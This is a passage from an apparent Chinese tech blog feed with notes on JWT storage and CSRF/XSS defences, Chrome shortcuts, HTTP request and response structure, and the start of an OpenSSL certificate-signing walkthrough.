CSRF</th><th>生命周期</th><th>自动携带</th><th>使用难度</th></tr></thead><tbody><tr><td><code>localStorage</code></td><td>❌</td><td>✅</td><td>持久（页面刷新不丢失）</td><td>❌</td><td>简单</td></tr><tr><td><code>sessionStorage</code></td><td>❌</td><td>✅</td><td>短暂（页面关闭丢失）</td><td>❌</td><td>简单</td></tr><tr><td>HTTP-only Cookie</td><td>✅</td><td>❌</td><td>可控（根据设置）</td><td>✅</td><td>中等</td></tr><tr><td>内存中</td><td>✅</td><td>✅</td><td>短暂（页面刷新丢失）</td><td>❌</td><td>简单</td></tr></tbody></table><hr><h3 id="最佳实践建议"><a href="#最佳实践建议" class="headerlink" title="最佳实践建议"></a><strong>最佳实践建议</strong></h3><ol><li><strong>安全性优先（推荐）</strong>：HTTP-only Cookie + CSRF 防范（<code>SameSite=Strict</code>、CSRF Token、Origin 校验）。</li><li><strong>灵活性优先</strong>：<code>localStorage</code> 或 <code>sessionStorage</code>，同时加强 XSS 防护（CSP、转义输出、禁用内联脚本）。</li><li><strong>短期敏感操作</strong>：将 JWT 保存在内存中，只用于当前页面生命周期。</li></ol><p>如果你的 JWT 主要用于 API 调用，并且希望自动携带认证凭证，<strong>HTTP-only Cookie 是最安全的选择</strong>。<br>如果你的应用是 SPA，且希望前端灵活控制 token，<code>localStorage</code> 或 <code>sessionStorage</code> 会更方便，但请务必加强 XSS 防范。</p>]]></content>
    
    
    <categories>
      
      <category>网络攻击</category>
      
      <category>跨站请求伪造攻击（CSRF）</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Chrome</title>
    <link href="/2025/03/27/%E7%AC%94%E8%AE%B0%EF%BC%9AChrome/"/>
    <url>/2025/03/27/%E7%AC%94%E8%AE%B0%EF%BC%9AChrome/</url>
    
    <content type="html"><![CDATA[<h3 id="1-Chrome-打开默认全屏"><a href="#1-Chrome-打开默认全屏" class="headerlink" title="1. Chrome 打开默认全屏"></a>1. Chrome 打开默认全屏</h3><p>在桌面上右键点击 Chrome 快捷方式，选择 <strong>“属性”</strong>，在<strong>目标框</strong>中添加 <code>--start-fullscreen</code>，并将<strong>运行方式</strong>设置为最大化。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-string">&quot;C:<span class="hljs-char escape_">\P</span>rogram Files<span class="hljs-char escape_">\G</span>oogle<span class="hljs-char escape_">\C</span>hrome<span class="hljs-char escape_">\A</span>pplication<span class="hljs-char escape_">\c</span>hrome.exe&quot;</span> <span class="hljs-operator">-</span>-start-fullscreen<br></code></pre></td></tr></table></figure><hr><h3 id="2-常用快捷键"><a href="#2-常用快捷键" class="headerlink" title="2. 常用快捷键"></a>2. 常用快捷键</h3><ol><li>&#x3D;&#x3D;新建标签页&#x3D;&#x3D;：<ol><li>Ctrl + T</li></ol></li><li>&#x3D;&#x3D;关闭当前标签页&#x3D;&#x3D;：<ol><li>Ctrl + W</li></ol></li><li>&#x3D;&#x3D;关闭窗口&#x3D;&#x3D;：<ol><li>Alt + F4</li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
      <category>Chrome</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：HTTP、HTTPS 协议</title>
    <link href="/2025/03/24/%E7%AC%94%E8%AE%B0%EF%BC%9AHTTP%E3%80%81HTTPS%20%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/03/24/%E7%AC%94%E8%AE%B0%EF%BC%9AHTTP%E3%80%81HTTPS%20%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h3 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h3><h4 id="HTTP-请求概述"><a href="#HTTP-请求概述" class="headerlink" title="HTTP 请求概述"></a>HTTP 请求概述</h4><p>HTTP请求通常包含以下几个部分：</p><ol><li>&#x3D;&#x3D;请求行&#x3D;&#x3D; ：<ol><li>包含请求方法、请求目标和HTTP版本</li></ol></li><li>&#x3D;&#x3D;请求头&#x3D;&#x3D; ：<ol><li>包含关于客户端和请求的附加信息</li></ol></li><li>&#x3D;&#x3D;空白行&#x3D;&#x3D;：<ol><li>请求头和请求体之间有一个空行，表示请求头的结束</li></ol></li><li>&#x3D;&#x3D;请求体&#x3D;&#x3D;：<ol><li>仅在某些请求方法（如 POST、PUT、PATCH）中发送，包含要发送到服务器的数据。<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 请求行</span><br>POST <span class="hljs-symbol">/submit</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-comment"># 请求头</span><br><span class="hljs-params">Host:</span> www.example.com<br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">34</span><br><span class="hljs-comment"># 空白行</span><br><br><span class="hljs-comment"># 请求体</span><br>&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">30</span>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><hr><h4 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h4><p>请求行包含三部分内容：请求方法、请求目标、HTTP 版本</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">GET</span> <span class="hljs-string">/servlet05/getServlet?username=lucy&amp;userpwd=1111</span> <span class="hljs-string">HTTP/1.1</span><br> <span class="hljs-string">|</span>                            <span class="hljs-string">|</span>                            <span class="hljs-string">|</span><br><span class="hljs-string">请求方法</span>                   <span class="hljs-string">请求目标</span>                        <span class="hljs-string">HTTP版本</span><br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;请求方法&#x3D;&#x3D;：请求方法指明了客户端希望对资源执行的操作<ol><li><font color="#00b0f0">GET</font>：请求指定的资源。通常用于获取数据，不应有副作用（即不改变服务器状态）。</li><li><font color="#00b0f0">POST</font>：提交数据给服务器，通常用来提交表单或上传文件，可能会导致服务器状态改变。</li><li><font color="#00b0f0">PUT</font>：更新指定的资源，通常用于替换资源的当前表示。</li><li><font color="#00b0f0">DELETE</font>：删除指定的资源。</li><li><font color="#00b0f0">HEAD</font>：类似于GET，但服务器只返回响应头，不返回响应体，常用于检查资源的有效性。</li><li><font color="#00b0f0">OPTIONS</font>：描述目标资源的通信选项，通常用于CORS（跨源资源共享）请求。</li><li><font color="#00b0f0">PATCH</font>：对资源进行部分修改。</li></ol></li><li>&#x3D;&#x3D;请求目标&#x3D;&#x3D;：请求目标可以是以下几种形式<ol><li><font color="#00b0f0">绝对URI</font>：如 <code>http://www.example.com/index.html</code>，包含协议、主机名和路径。</li><li><font color="#00b0f0">相对URI</font>：如 <code>/index.html</code>，相对于请求的主机和协议。</li><li><font color="#00b0f0">星号（*）</font>：用于OPTIONS请求，表示请求的资源不特指任何URI。</li></ol></li><li>&#x3D;&#x3D;HTTP版本&#x3D;&#x3D;：HTTP版本指明了所使用的HTTP协议的版本。<ol><li><font color="#00b0f0">HTTP&#x2F;1.1</font>：当前使用最广泛的版本，支持持久连接和分块传输编码等特性。</li><li><font color="#00b0f0">HTTP&#x2F;2</font>：相对于1.1版本，支持多路复用、头部压缩等，提高性能。</li><li><font color="#00b0f0">HTTP&#x2F;3</font>：基于QUIC协议，进一步提高性能，特别是在高延迟网络中。</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项<br>Cookie 位于请求头中，而非请求行中。</p></blockquote><hr><h4 id="3、请求头"><a href="#3、请求头" class="headerlink" title="3、请求头"></a>3、请求头</h4><p>请求头包含许多不同的字段，每个字段都有特定的作用。以下是一些常见的HTTP请求头：</p><ol><li>&#x3D;&#x3D;通用请求头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Host</font>：指定服务器的域名和端口号，例如：<code>Host: www.example.com:8080</code>。</li><li><font color="#00b0f0">User-Agent</font>：发送请求的客户端软件信息（如浏览器类型及版本）。</li><li><font color="#00b0f0">Accept</font>：<ol><li>告诉服务器客户端可以处理哪些内容类型（MIME 类型），服务器会根据 <code>Accept</code> 头选择合适的内容类型响应，如果服务器无法提供合适的格式，通常会返回 406（Not Acceptable）状态码。</li><li>前端可以明确设置 <code>Accept</code> 头，例如可以使用 AJA，轻松地设置。</li><li>如果前端未明确设置 <code>Accept</code> 头，浏览器会发送默认的 <code>Accept</code> 值，一般为：<code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</code>。</li></ol></li><li><font color="#00b0f0">Accept-Encoding</font>：客户端可接受的内容编码（如 <code>gzip</code>, <code>deflate</code>）。</li><li><font color="#00b0f0">Accept-Language</font>：客户端可接受的语言。</li><li><font color="#00b0f0">Cache-Control</font>：指定请求和响应遵循的缓存机制。</li><li><font color="#00b0f0">Connection</font>：控制连接的选项（如 <code>keep-alive</code>）。</li><li><font color="#00b0f0">Cookie</font>：包含发送到服务器的cookie数据，例如：<code>Cookie: name=value; name2=value2; ...</code>。</li><li><font color="#00b0f0">Referer</font>：指明请求来源的URI。</li><li><font color="#00b0f0">Authorization</font>：包含用于认证的凭证（如 Basic, Bearer tokens）。</li><li><font color="#00b0f0">Upgrade-Insecure-Requests</font>：表示客户端希望升级到HTTPS。</li></ol></li><li>&#x3D;&#x3D;实体头（与请求体有关）&#x3D;&#x3D;<ol><li><font color="#00b0f0">Content-Type</font>：<strong>请求体</strong>的MIME类型和字符集，例如：<code>Content-Type: text/html; charset=utf-8</code>。</li><li><font color="#00b0f0">Content-Length</font>：请求体的字节长度，例如：<code>Content-Length: 348</code>。</li><li><font color="#00b0f0">Content-Encoding</font>：请求体的编码方式。</li><li><font color="#00b0f0">Content-Language</font>：请求体使用的语言。</li><li><font color="#00b0f0">Content-Location</font>：请求体的实际位置。</li></ol></li><li>&#x3D;&#x3D;条件请求头&#x3D;&#x3D;<ol><li><font color="#00b0f0">If-Match</font>：仅当实体标记（ETag）匹配时才执行请求。</li><li><font color="#00b0f0">If-None-Match</font>：仅当实体标记（ETag）不匹配时才执行请求。</li><li><font color="#00b0f0">If-Modified-Since</font>：仅当资源自指定时间之后修改过才执行请求。</li><li><font color="#00b0f0">If-Unmodified-Since</font>：仅当资源自指定时间之后未修改才执行请求。</li></ol></li><li>&#x3D;&#x3D;请求控制头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Range</font>：请求获取部分的内容。</li><li><font color="#00b0f0">Expect</font>：指示服务器行为的期望（如 100-continue）。</li><li><font color="#00b0f0">TE</font>：传输编码的扩展（如 trailers, chunked）。</li></ol></li><li>&#x3D;&#x3D;代理请求头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Via</font>：告知通过哪些代理服务器。</li><li><font color="#00b0f0">Forwarded</font>：指定代理服务器转发的请求信息。</li><li><font color="#00b0f0">X-Forwarded-For</font>：记录原始客户端的IP地址。</li><li><font color="#00b0f0">X-Forwarded-Proto</font>：记录原始协议（HTTP或HTTPS）。</li></ol></li></ol><hr><h4 id="4、请求体（正文）"><a href="#4、请求体（正文）" class="headerlink" title="4、请求体（正文）"></a>4、请求体（正文）</h4><p>请求体主要用于携带需要发送到服务器的数据，在一些特定的HTTP方法中使用，如 POST、PUT 和 PATCH 等</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">45</span><br><br>&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;john_doe&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;securepassword123&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项<br>请求体的数据格式（MIME类型）需要通过<code>Content-Type</code>请求头指定</p></blockquote><hr><h3 id="HTTP-响应"><a href="#HTTP-响应" class="headerlink" title="HTTP 响应"></a>HTTP 响应</h3><h4 id="1、HTTP-响应概述"><a href="#1、HTTP-响应概述" class="headerlink" title="1、HTTP 响应概述"></a>1、HTTP 响应概述</h4><p>HTTP 响应协议，包含四部分内容：状态行、响应头、空白行、响应体</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 状态行</span><br>HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-comment"># 响应头</span><br><span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/json</span><br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">34</span><br><span class="hljs-params">Date:</span> Sun, <span class="hljs-number">16</span> Sep <span class="hljs-number">2024</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT<br><span class="hljs-params">Server:</span> Apache<span class="hljs-symbol">/2.4.41</span> (Ubuntu)<br><span class="hljs-comment"># 空白行</span><br><br><span class="hljs-comment"># 响应体</span><br>&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hello, world!&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>HTTP响应常包含以下几个部分：</p><ol><li><font color="#00b0f0">状态行</font>：包含HTTP版本、状态码和状态描述</li><li><font color="#00b0f0">响应头</font>：包含关于服务器和响应的附加信息、</li><li><font color="#00b0f0">空白行</font>：响应头和响应体之间有一个空白行，表示响应头的结束</li><li><font color="#00b0f0">响应体</font>：包含实际的数据内容，如HTML页面、JSON数据、图像等。</li></ol><hr><h4 id="2、状态行"><a href="#2、状态行" class="headerlink" title="2、状态行"></a>2、状态行</h4><p>状态行包含三部分内容：HTTP 版本、状态码、状态消息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;HTTP 版本&#x3D;&#x3D;：表示所使用的 HTTP 协议版本，例如 <code>HTTP/1.1</code> 或 <code>HTTP/2</code></li><li>&#x3D;&#x3D;状态码 + 状态消息&#x3D;&#x3D;：状态码是一个三位数的数字，用于表示服务器对请求的处理结果；状态消息则是对状态码的简要描述，通常以短语形式呈现。<ol><li><font color="#00b0f0">1xx（信息性状态码）</font>：<ul><li>这些状态码表示请求已被接收，继续处理。</li><li>例如：<code>100 Continue</code>。</li></ul></li><li><font color="#00b0f0">2xx（成功状态码）</font>：<ul><li>表示请求已经成功被服务器接收、理解和处理。</li><li>例如：<ul><li><code>200 OK</code>：请求成功。</li><li><code>201 Created</code>：请求成功并创建了资源。</li><li><code>204 No Content</code>：请求成功但没有返回内容。</li></ul></li></ul></li><li><font color="#00b0f0">3xx（重定向状态码）</font>：<ul><li>表示需要客户端进一步操作才能完成请求。</li><li>例如：<ul><li><code>301 Moved Permanently</code>：资源已被永久移动到新位置。</li><li><code>302 Found</code>：资源临时移动到新位置。</li><li><code>304 Not Modified</code>：资源未被修改，可以使用缓存的版本。</li></ul></li></ul></li><li><font color="#00b0f0">4xx（客户端错误状态码）</font>：<ul><li>表示请求有语法错误或无法完成。</li><li>例如：<ul><li><code>400 Bad Request</code>：请求无效。</li><li><code>401 Unauthorized</code>：需要身份验证。</li><li><code>404 Not Found</code>：请求的资源未找到。</li></ul></li></ul></li><li><font color="#00b0f0">5xx（服务器错误状态码）</font>：<ul><li>表示服务器在处理请求时发生错误。</li><li>例如：<ul><li><code>500 Internal Server Error</code>：服务器内部错误。</li><li><code>503 Service Unavailable</code>：服务器暂时无法处理请求。</li></ul></li></ul></li></ol></li></ol><hr><h4 id="3、响应头"><a href="#3、响应头" class="headerlink" title="3、响应头"></a>3、响应头</h4><p>响应头可以包括响应的状态信息、服务器信息、响应内容、缓存控制等。以下是一些常见的HTTP响应头：</p><ol><li>&#x3D;&#x3D;通用响应头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Connection</font>：控制连接的行为，例如：<code>Connection:keep-alive</code><ol><li><font color="#00b0f0">keep-alive</font>：处理完一个请求后，客户端和服务器之间的 TCP 连接不关闭，保持打开状态，以便可以复用该连接进行后续的请求和响应。</li><li>. <font color="#00b0f0">close</font>：完成当前请求&#x2F;响应后，服务器或客户端希望关闭 TCP 连接，不再复用该连接。</li></ol></li><li><font color="#00b0f0">Date</font>：服务器生成响应的日期和时间。例如，<code>Date: Wed, 21 Oct 2015 07:28:00 GMT</code>。</li><li><font color="#00b0f0">Server</font>：服务器软件的信息。例如，<code>Server: Apache/2.4.1 (Unix)</code>。</li></ol></li><li>&#x3D;&#x3D;实体头（与响应头有关）&#x3D;&#x3D;<ol><li><font color="#00b0f0">Content-Type</font>：<strong>响应体</strong>的 MIME 类型（数据库实际返回的数据类型） 和字符集。例如，<code>Content-Type: text/html; charset=UTF-8</code>。</li><li><font color="#00b0f0">Content-Length</font>：响应体的字节长度。例如，<code>Content-Length: 348</code>。</li><li><font color="#00b0f0">Content-Encoding</font>：响应体的编码方式（如<code>gzip</code>）</li><li><font color="#00b0f0">Content-Language</font>：响应体使用的语言。</li><li><font color="#00b0f0">Content-Location</font>：响应体的实际位置。</li></ol></li><li>&#x3D;&#x3D;缓存控制头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Cache-Control</font>：指定请求和响应遵循的缓存机制。例如，<code>Cache-Control: no-cache</code>。</li><li><font color="#00b0f0">Expires</font>：响应过期的日期和时间。例如，<code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code>。</li><li><font color="#00b0f0">ETag</font>：资源的特定版本标识符。例如，<code>ETag: &quot;xyzzy&quot;</code>。</li><li><font color="#00b0f0">Last-Modified</font>：资源的最后修改日期。例如，<code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code></li></ol></li><li>&#x3D;&#x3D;重定向头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Location</font>：用于重定向的URL。例如，<code>Location: http://www.example.org/</code>。</li></ol></li><li>&#x3D;&#x3D;安全头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Set-Cookie</font>：设置HTTP cookie。例如，<code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code>。</li><li><font color="#00b0f0">Strict-Transport-Security</font>：强制客户端使用HTTPS。例如，<code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>。</li><li><font color="#00b0f0">X-Content-Type-Options</font>：防止浏览器猜测内容类型。例如，<code>X-Content-Type-Options: nosniff</code>。</li><li><font color="#00b0f0">Content-Security-Policy</font>：控制资源加载策略。例如，<code>Content-Security-Policy: default-src &#39;self&#39;</code>。</li><li><font color="#00b0f0">X-Frame-Options</font>：防止点击劫持（clickjacking）。例如，<code>X-Frame-Options: DENY</code>。</li></ol></li><li>&#x3D;&#x3D;其他头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Accept-Ranges</font>：是否支持范围请求。例如，<code>Accept-Ranges: bytes</code>。</li><li><font color="#00b0f0">Allow</font>：允许的HTTP方法。例如，<code>Allow: GET, POST, HEAD</code>。</li><li><font color="#00b0f0">Vary</font>：指定哪些头部用来决定缓存的版本。例如，<code>Vary: Accept-Encoding</code>。</li></ol></li><li>&#x3D;&#x3D;通用响应头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Connection</font>：控制连接的行为，例如：<code>Connection: keep-alive</code></li><li><font color="#00b0f0">keep-alive</font>：处理完一个请求后，客户端和服务器之间的 TCP 连接不关闭，保持打开状态，以便可以复用该连接进行后续的请求和响应。<ol><li>close：完成当前请求&#x2F;响应后，服务器或客户端希望关闭 TCP 连接，不再复用该连接。</li></ol></li><li><font color="#00b0f0">Date</font>：服务器生成响应的日期和时间。例如，<code>Date: Wed, 21 Oct 2015 07:28:00 GMT</code>。</li><li><font color="#00b0f0">Server</font>：服务器软件的信息。例如，<code>Server: Apache/2.4.1 (Unix)</code>。</li></ol></li><li>&#x3D;&#x3D;实体头（与响应头有关）&#x3D;&#x3D;<ol><li><font color="#00b0f0">Content-Type</font>：<strong>响应体</strong>的 MIME 类型（数据库实际返回的数据类型） 和字符集。例如，<code>Content-Type: text/html; charset=UTF-8</code>。</li><li><font color="#00b0f0">Content-Length</font>：响应体的字节长度。例如，<code>Content-Length: 348</code>。</li><li><font color="#00b0f0">Content-Encoding</font>：响应体的编码方式（如 <code>gzip</code>）。</li><li><font color="#00b0f0">Content-Language</font>：响应体使用的语言。</li><li><font color="#00b0f0">Content-Location</font>：响应体的实际位置。</li></ol></li><li>&#x3D;&#x3D;缓存控制头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Cache-Control</font>：指定请求和响应遵循的缓存机制。例如，<code>Cache-Control: no-cache</code>。</li><li><font color="#00b0f0">Expires</font>：响应过期的日期和时间。例如，<code>Expires: Thu, 01 Dec 1994 16:00:00 GMT</code>。</li><li><font color="#00b0f0">ETag</font>：资源的特定版本标识符。例如，<code>ETag: &quot;xyzzy&quot;</code>。</li><li><font color="#00b0f0">Last-Modified</font>：资源的最后修改日期。例如，<code>Last-Modified: Tue, 15 Nov 1994 12:45:26 GMT</code>。</li></ol></li><li>&#x3D;&#x3D;重定向头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Location</font>：用于重定向的URL。例如，<code>Location: http://www.example.org/</code>。</li></ol></li><li>&#x3D;&#x3D;安全头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Set-Cookie</font>：设置HTTP cookie。例如，<code>Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</code>。</li><li><font color="#00b0f0">Strict-Transport-Security</font>：强制客户端使用HTTPS。例如，<code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>。</li><li><font color="#00b0f0">X-Content-Type-Options</font>：防止浏览器猜测内容类型。例如，<code>X-Content-Type-Options: nosniff</code>。</li><li><font color="#00b0f0">Content-Security-Policy</font>：控制资源加载策略。例如，<code>Content-Security-Policy: default-src &#39;self&#39;</code>。</li><li><font color="#00b0f0">X-Frame-Options</font>：防止点击劫持（clickjacking）。例如，<code>X-Frame-Options: DENY</code>。</li></ol></li><li>&#x3D;&#x3D;其他头&#x3D;&#x3D;<ol><li><font color="#00b0f0">Accept-Ranges</font>：是否支持范围请求。例如，<code>Accept-Ranges: bytes</code>。</li><li><font color="#00b0f0">Allow</font>：允许的HTTP方法。例如，<code>Allow: GET, POST, HEAD</code>。</li><li><font color="#00b0f0">Vary</font>：指定哪些头部用来决定缓存的版本。例如，<code>Vary: Accept-Encoding</code>。</li></ol></li></ol><hr><h4 id="4、响应体"><a href="#4、响应体" class="headerlink" title="4、响应体"></a>4、响应体</h4><p>响应体包含服务器返回的实际数据</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/json</span><br><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">123</span><br><br>&#123;<br>  <span class="hljs-attr">&quot;message&quot;:</span> <span class="hljs-string">&quot;Hello, world!&quot;</span>,<br>  <span class="hljs-attr">&quot;status&quot;:</span> <span class="hljs-string">&quot;success&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项<br>响应体的数据格式（MIME类型）需要通过 <code>Content-Type</code> 响应体指定</p></blockquote><h2 id="—"><a href="#—" class="headerlink" title="—-"></a>—-</h2><h3 id="1-HTTPS-概述"><a href="#1-HTTPS-概述" class="headerlink" title="1. HTTPS 概述"></a>1. HTTPS 概述</h3><p>HTTPS（HyperText Transfer Protocol Secure，超文本传输安全协议）是 HTTP 的安全版本，它通过 <strong>SSL&#x2F;TLS</strong> 加密传输数据，防止被窃听、篡改和劫持。</p><p>其实也不用把 HTTPS 看得太神，它的主要作用就是在你和目标服务器之间建立加密通信，防止中间人窃听数据，或者偷偷把你的请求导向一台恶意服务器。比如，你要访问的服务跑在 <code>192.168.136.8</code> 上，HTTPS 证书中也明确写了 <code>192.168.136.8</code> 是可信地址。这时通信是安全的。但如果有中间人把流量引导到一台伪装的服务器，比如 <code>10.10.2.3</code>，而这个地址并没有出现在证书中，浏览器就会识别出不匹配并给出安全警告。</p><p>一个常见的误区是以为 HTTPS 能帮你判断哪个网站是“好人”、哪个是“坏人”，其实它根本不负责做价值判断。它只负责把你和“证书里写明的那个服务器”之间的通信加密，至于那个服务器本身是不是邪恶的，它并不关心。</p><hr><h3 id="2-HTTPS-工作流程（从申请-HTTPS-证书到-HTTPS-通信完整流程）"><a href="#2-HTTPS-工作流程（从申请-HTTPS-证书到-HTTPS-通信完整流程）" class="headerlink" title="2. HTTPS 工作流程（从申请 HTTPS 证书到 HTTPS 通信完整流程）"></a>2. HTTPS 工作流程（从申请 HTTPS 证书到 HTTPS 通信完整流程）</h3><p>&#x3D;&#x3D;1.登录网站服务器&#x3D;&#x3D;<br>登录你的网站服务器（Linux 系统），后续操作将在服务器上进行。</p><p>&#x3D;&#x3D;2.安装 OpenSSL 服务&#x3D;&#x3D;<br>在 <code>Ubuntu</code> 系统上，可执行以下命令安装 OpenSSL：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt install openssl<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.生成服务器私钥（Private Key）&#x3D;&#x3D;<br>使用 OpenSSL 生成 RSA 算法的服务器私钥，并用 AES-256 加密保护私钥文件，这个服务器私钥我们务必好好保管、留存一份<br>例如下面指令的流程是：</p><ol><li>OpenSSL 使用 RSA 算法生产了一对秘钥（私钥和公钥）</li><li>然后用 AES-256 加密算法，把生成的私钥加密保存成 <code>ca.key</code> （加密秘钥当我们执行下面的指令后，会提示输入密码），以后如果想要解密这个秘钥，OpenSSL 就会要求我们再输入这个密码<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">openssl genpkey -algorithm RSA -<span class="hljs-keyword">out</span> <span class="hljs-keyword">private</span>.key -pkeyopt rsa_keygen_bits:<span class="hljs-number">2048</span> -aes256<br></code></pre></td></tr></table></figure></li><li><code>-algorithm RSA</code>：<ol><li>指定了<strong>生成的私钥使用的加密算法</strong>，这里使用的是 RSA（Rivest-Shamir-Adleman）算法</li><li>RSA 是一种常见的秘钥加密算法，广泛用于 SSL&#x2F;TLS 证书中</li></ol></li><li><code>-out private.key</code>：<ol><li>指定生成的私钥文件保存的路径和文件名</li></ol></li><li><code>-pkeyopt rsa_keygen_bits:2048</code>：<ol><li>指定 RSA 秘钥长度，常有 2048、4096 位</li></ol></li><li><code>-aes256</code>：<ol><li>表示使用 AES 256 位加密 来<strong>加密私钥文件</strong>。</li></ol></li></ol><p>&#x3D;&#x3D;4.创建 HTTPS 证书签名请求（CSR）&#x3D;&#x3D;<br>CSR 是申请证书时提供给 CA 的请求文件，其中包含了服务器的公钥（自动从私钥推导出的公钥）和身份信息：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># 1. 创建并编辑配置文件 san.cnf</span><br>vim san.cnf<br><br><br><span class="hljs-comment"># 2. 添加下面的内容（下面是权威 CSR内容）</span><br><span class="hljs-comment"># 2.1. 注解版</span><br>[ req ]<br>distinguished_name = req_distinguished_name       <span class="hljs-comment"># 